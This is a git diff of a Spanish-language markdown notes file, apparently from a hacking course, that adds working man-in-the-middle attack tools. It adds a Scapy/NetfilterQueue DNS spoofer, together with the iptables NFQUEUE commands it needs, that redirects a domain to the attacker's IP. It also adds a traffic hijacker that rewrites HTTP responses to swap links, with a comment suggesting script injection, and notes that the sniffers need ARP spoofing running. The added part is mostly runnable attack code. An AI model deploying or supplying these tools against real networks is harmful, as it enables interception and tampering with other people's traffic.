@@ -315,6 +315,8 @@ if __name__ == '__main__':
 
 ## Rastreador de consultas HTTP (HTTP sniffer) con Scapy
 
+Es necesario ejecutar el ARP Spoofer.
+
 ```python
 #!/usr/bin/env python3
 
@@ -359,6 +361,8 @@ if __name__ == '__main__':
 ```
 
 ## Rastreador de consultas HTTPS (HTTPS Sniffer) con mitmdump
+
+Es necesario ejecutar el ARP Spoofer.
 
 - Instálalo:
 
@@ -427,6 +431,8 @@ def request(packet):
 
 ## Rastreador de imágenes por HTTPS (HTTPS Image Sniffer) con mitmdump
 
+Es necesario ejecutar el ARP Spoofer.
+
 ```python
 #!/usr/bin/env python3
 
@@ -456,3 +462,120 @@ def response(packet):
 
 - Ejecutar con `mitmdump -s https_image_sniffer.py --quiet`
 
+## DNS Spoofer con Scapy y NetfilterQueue
+
+Es necesario ejecutar el ARP Spoofer.
+
+Ejecutar los siguientes comandos para poder redirigir paquetes entrantes, salientes y los que se estén redirigiendo a la cola con id 0:
+
+```shell
+iptables -I INPUT -j NFQUEUE --queue-num 0
+iptables -I OUTPUT -j NFQUEUE --queue-num 0
+iptables -I FORWARD -j NFQUEUE --queue-num 0
+iptables --policy FORWARD ACCEPT # para el envenenamiento ARP (aceptar los paquetes entrantes y poderlos redirigir al destino legítimo)
+```
+
+```python
+#!/usr/bin/env python3
+
+import netfilterqueue
+import scapy.all as scapy
+import signal
+import sys
+
+def def_handler(sig, frame):
+    print(f"\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+
+    if scapy_packet.haslayer(scapy.DNSRR):
+        #print(scapy_packet)
+        qname = scapy_packet[scapy.DNSQR].qname # para obtener el nombre de dominio
+
+        if b"hack4u.io" in qname:
+            print(f"\n[+] Envenenando el dominio hack4u.io")
+            
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.40") # en rdata poner nuestra IP    
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1 # para que no de conflictos
+
+            del scapy_packet[scapy.IP].len # borramos el campo de longitud
+            del scapy_packet[scapy.IP].chksum # borramos el campo de checksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(scapy_packet.build()) # con build() pones el paquete en formato bytes
+
+    packet.accept() # sin esto no se puede navegar porqyue el tráfico no se acepta 
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet) # 0 es el número de cola
+queue.run() # Está continuamente analizando
+```
+
+## Manipulador e Interceptor de tráfico (Traffic Hijacking)
+
+Es necesario ejecutar el ARP Spoofer.
+
+Ejecutar los siguientes comandos para poder redirigir paquetes entrantes, salientes y los que se estén redirigiendo a la cola con id 0:
+
+```shell
+iptables -I INPUT -j NFQUEUE --queue-num 0
+iptables -I OUTPUT -j NFQUEUE --queue-num 0
+iptables -I FORWARD -j NFQUEUE --queue-num 0
+iptables --policy FORWARD ACCEPT # para el envenenamiento ARP (aceptar los paquetes entrantes y poderlos redirigir al destino legítimo)
+```
+
+```python
+#!/usr/bin/env python3
+
+import netfilterqueue
+import scapy.all as scapy
+import re
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+
+    del packet[scapy.IP].len # para evitar la comprobación de la integridad del paquete
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+
+    if scapy_packet.haslayer(scapy.Raw):
+        try:
+            if scapy_packet[scapy.TCP].dport == 80:
+                print(f"\n[+] Solicitud:\n")
+                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load) # para evitar que el servidor responda sin comprimir toda la data
+                new_packet = set_load(scapy_packet, modified_load) # paquete modificado
+                packet.set_payload(new_packet.build())
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print(f"\n[+] Respuesta del servidor:\n")
+                #modified_load = scapy_packet[scapy.Raw].load.replace(b"Home of Acunetix Art", b"Hacked") # se sustituye una parte del código fuente de la web
+                modified_load = scapy_packet[scapy.Raw].load.replace(b'<a href="https://www.acunetix.com/vulnerability-scanner">', b'<a href="https://hack4u.io">') # modificamos un enlace para que lleve al que nosotros queremos
+                # Podrías meter un script antes de una etiqueta o cualquier cosa
+                new_packet = set_load(scapy_packet, modified_load)
+                packet.set_payload(new_packet.build())
+                print(scapy_packet.show())
+        #except Exception as e: # genera ruido
+        #    print(f"\n[ERROR]: {e}")
+        except:
+            pass
+
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+```
+
+## Generar Expresiones regulares en python (regex generator)
+
+> Go to [pythex.org](http://pythex.org/)
